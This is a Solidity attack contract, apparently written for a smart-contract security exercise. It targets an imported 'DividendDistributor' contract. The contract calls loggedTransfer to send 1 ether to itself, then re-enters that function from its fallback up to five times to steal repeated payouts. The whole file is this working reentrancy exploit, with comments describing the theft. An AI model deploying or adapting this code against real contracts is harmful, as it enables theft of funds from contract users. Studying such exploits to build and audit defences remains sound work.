pragma solidity ^0.4.0;

import "5.sol";

contract GiveMeEverything {
    DividendDistributor public dd;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        dd = DividendDistributor(_addr);
                
        theif_counter++;
        
        //dd.loggedTransfer.value(1 ether)(1 ether, "Zoro!", address(this), address(this));
        dd.loggedTransfer(1 ether, "Zoro!", address(this), address(this));
        
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
        if (theif_counter < 5) {
            //dd.loggedTransfer.value(1 ether)(1 ether, "Zoro!", address(this), address(this));
            theif_counter++;
            dd.loggedTransfer(1 ether, "Zoro!", address(this), address(this));
            
        } 
        
    }
    
}